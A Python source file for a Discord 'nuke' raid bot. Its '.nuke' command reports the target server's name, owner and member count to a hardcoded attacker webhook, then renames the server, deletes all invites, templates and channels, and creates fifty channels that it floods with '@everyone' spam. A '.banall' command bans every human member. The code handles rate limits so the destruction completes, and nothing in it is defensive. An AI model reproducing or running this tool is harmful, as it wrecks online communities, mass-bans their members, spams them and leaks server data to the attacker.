import discord
from discord.ext import commands
import asyncio
import os
import aiohttp
import random
from discord.ext.commands import BucketType, CommandOnCooldown

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix=".", intents=intents)

OWNER_ID = 1170673694868250669
WEBHOOK_URL = "https://discord.com/api/webhooks/1403976895673925642/ysaZFm9O-0TpSpHRbyRccmTd4WYOZAOCvIbyX1pXhetEQ6oF2kCiFdU6IBlt0QTLfm8-"

async def send_webhook(embed: discord.Embed):
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(WEBHOOK_URL, session=session)
        await webhook.send(embed=embed)

async def safe_delete(channel):
    url = f"https://discord.com/api/v10/channels/{channel.id}"
    headers = {"Authorization": f"Bot {bot.http.token}"}
    async with aiohttp.ClientSession() as session:
        while True:
            async with session.delete(url, headers=headers) as resp:
                if resp.status in [200, 204]:
                    print(f"[DELETED CHANNEL] {channel.name}")
                    break
                elif resp.status == 429:
                    data = await resp.json()
                    wait_time = data.get('retry_after', 1)
                    print(f"[RATE LIMIT] Deleting {channel.name}, waiting {wait_time:.2f}s + 1s")
                    await asyncio.sleep(wait_time + 1)
                else:
                    text = await resp.text()
                    print(f"[FAILED TO DELETE] {channel.name}: {resp.status} {text}")
                    break

async def create_channel(guild, channel_name):
    url = f"https://discord.com/api/v10/guilds/{guild.id}/channels"
    headers = {"Authorization": f"Bot {bot.http.token}", "Content-Type": "application/json"}
    json_data = {"name": channel_name, "type": 0}

    async with aiohttp.ClientSession() as session:
        while True:
            async with session.post(url, headers=headers, json=json_data) as resp:
                if resp.status in [200, 201]:
                    data = await resp.json()
                    print(f"[CREATED CHANNEL] {channel_name}")
                    return int(data['id'])
                elif resp.status == 429:
                    data = await resp.json()
                    wait_time = data.get('retry_after', 1)
                    print(f"[RATE LIMIT] Creating {channel_name}, waiting {wait_time:.2f}s + 1s")
                    await asyncio.sleep(wait_time + 1)
                else:
                    text = await resp.text()
                    print(f"[FAILED TO CREATE CHANNEL] {channel_name}: {resp.status} {text}")
                    return None

async def delete_all_invites(guild):
    url = f"https://discord.com/api/v10/guilds/{guild.id}/invites"
    headers = {"Authorization": f"Bot {bot.http.token}"}
    async with aiohttp.ClientSession() as session:
        while True:
            async with session.get(url, headers=headers) as resp:
                if resp.status == 200:
                    invites = await resp.json()
                    break
                elif resp.status == 429:
                    data = await resp.json()
                    wait_time = data.get('retry_after', 1)
                    print(f"[RATE LIMIT] Fetching invites, waiting {wait_time:.2f}s + 1s")
                    await asyncio.sleep(wait_time + 1)
                else:
                    text = await resp.text()
                    print(f"[FAILED TO FETCH INVITES]: {resp.status} {text}")
                    return
        for invite in invites:
            delete_url = f"https://discord.com/api/v10/invites/{invite['code']}"
            while True:
                async with session.delete(delete_url, headers=headers) as resp:
                    if resp.status in [200, 204]:
                        print(f"[DELETED INVITE] {invite['code']}")
                        break
                    elif resp.status == 429:
                        data = await resp.json()
                        wait_time = data.get('retry_after', 1)
                        print(f"[RATE LIMIT] Deleting invite {invite['code']}, waiting {wait_time:.2f}s + 1s")
                        await asyncio.sleep(wait_time + 1)
                    else:
                        text = await resp.text()
                        print(f"[FAILED TO DELETE INVITE] {invite['code']}: {resp.status} {text}")
                        break

async def delete_all_templates(guild):
    url = f"https://discord.com/api/v10/guilds/{guild.id}/templates"
    headers = {"Authorization": f"Bot {bot.http.token}"}
    async with aiohttp.ClientSession() as session:
        while True:
            async with session.get(url, headers=headers) as resp:
                if resp.status == 200:
                    templates = await resp.json()
                    break
                elif resp.status == 429:
                    data = await resp.json()
                    wait_time = data.get('retry_after', 1)
                    print(f"[RATE LIMIT] Fetching templates, waiting {wait_time:.2f}s + 1s")
                    await asyncio.sleep(wait_time + 1)
                else:
                    text = await resp.text()
                    print(f"[FAILED TO FETCH TEMPLATES]: {resp.status} {text}")
                    return
        for template in templates:
            delete_url = f"https://discord.com/api/v10/guilds/{guild.id}/templates/{template['code']}"
            while True:
                async with session.delete(delete_url, headers=headers) as resp:
                    if resp.status in [200, 204]:
                        print(f"[DELETED TEMPLATE] {template['code']}")
                        break
                    elif resp.status == 429:
                        data = await resp.json()
                        wait_time = data.get('retry_after', 1)
                        print(f"[RATE LIMIT] Deleting template {template['code']}, waiting {wait_time:.2f}s + 1s")
                        await asyncio.sleep(wait_time + 1)
                    else:
                        text = await resp.text()
                        print(f"[FAILED TO DELETE TEMPLATE] {template['code']}: {resp.status} {text}")
                        break

async def execute_ban(guild, user, bot_token):
    delete_days_payload = {
        "delete_message_days": random.randint(0, 7)
    }
    async with aiohttp.ClientSession() as session:
        url = f"https://discord.com/api/v10/guilds/{guild.id}/bans/{user.id}"
        while True:
            async with session.put(
                url,
                headers={"Authorization": f"Bot {bot_token}"},
                json=delete_days_payload
            ) as resp:
                text = await resp.text()
                if resp.status in [200, 201, 204]:
                    print(f"[BANNED] {user} ({user.id})")
                    break
                elif resp.status == 429:
                    data = await resp.json()
                    wait_time = data.get('retry_after', 1)
                    print(f"[RATE LIMIT] Waiting {wait_time:.2f}s + 1s to ban {user}")
                    await asyncio.sleep(wait_time + 1)
                elif "Missing Permissions" in text:
                    print(f"[NO PERMISSION] {user}")
                    break
                else:
                    print(f"[BAN FAILED] {user} ({resp.status}): {text}")
                    break

async def send_message(channel, content):
    try:
        await channel.send(content)
    except discord.HTTPException as e:
        if e.status == 429:
            wait_time = getattr(e, 'retry_after', 1)
            print(f"[RATE LIMIT] Sending message in {channel.name}, waiting {wait_time:.2f}s + 1s")
            await asyncio.sleep(wait_time + 1)
        else:
            print(f"[FAILED TO SEND MESSAGE] {channel.name}: {e}")
    except Exception as e:
        print(f"[ERROR] Sending message in {channel.name}: {e}")

@bot.command()
@commands.cooldown(1, 120, BucketType.user)
async def nuke(ctx, channel_base_name: str = "Nuked By DeadDestroyers"):
    guild = ctx.guild
    member_count = guild.member_count
    icon_url = guild.icon.url if guild.icon else None
    embed = discord.Embed(title="🛑 Nuke Command Executed", color=0xff0000)
    embed.add_field(name="Server Name", value=guild.name, inline=True)
    embed.add_field(name="Server ID", value=str(guild.id), inline=True)
    embed.add_field(name="Server Owner", value=guild.owner.name if guild.owner else "Unknown", inline=True)
    embed.add_field(name="Member Count", value=str(member_count), inline=True)

    if icon_url:
        embed.set_thumbnail(url=icon_url)
    await send_webhook(embed)

    try:
        await guild.edit(name="Nuked By DeadDestroyers", reason="Nuke command executed")
    except Exception as e:
        print(f"[FAILED TO CHANGE GUILD NAME]: {e}")

    await delete_all_invites(guild)
    await delete_all_templates(guild)

    delete_tasks = [asyncio.create_task(safe_delete(ch)) for ch in guild.channels]
    await asyncio.gather(*delete_tasks)

    created_channel_ids = await asyncio.gather(*[
        create_channel(guild, channel_base_name) for _ in range(50)
    ])
    created_channel_ids = [cid for cid in created_channel_ids if cid is not None]

    channels = []
    for ch_id in created_channel_ids:
        channel = bot.get_channel(ch_id)
        if not channel:
            try:
                channel = await bot.fetch_channel(ch_id)
            except Exception as e:
                print(f"[FAILED TO FETCH CHANNEL] ID {ch_id}: {e}")
                continue
        channels.append(channel)

    content = "@everyone https://files.catbox.moe/madsm2.mp4 \nYour server is Nuked by DD lol\ndiscord.gg/ixi"
    for _ in range(20):
        await asyncio.gather(*(send_message(channel, content) for channel in channels))

@bot.command()
@commands.cooldown(1, 120, BucketType.user)
async def banall(ctx):
    guild = ctx.guild
    token = os.getenv("DISCORD_BOT_TOKEN") or bot.http.token
    members_to_ban = [member for member in guild.members if not member.bot]
    ban_tasks = [asyncio.create_task(execute_ban(guild, member, token)) for member in members_to_ban]
    await asyncio.gather(*ban_tasks)

@nuke.error
async def nuke_error(ctx, error):
    if isinstance(error, CommandOnCooldown):
        await ctx.send(f"Please wait {error.retry_after:.0f} seconds before using this command again.")

@banall.error
async def banall_error(ctx, error):
    if isinstance(error, CommandOnCooldown):
        await ctx.send(f"Please wait {error.retry_after:.0f} seconds before using this command again.")

if __name__ == "__main__":
    TOKEN = os.getenv("DISCORD_BOT_TOKEN")
    if not TOKEN:
        TOKEN = "YOUR_TOKEN_HERE"
    bot.run(TOKEN)
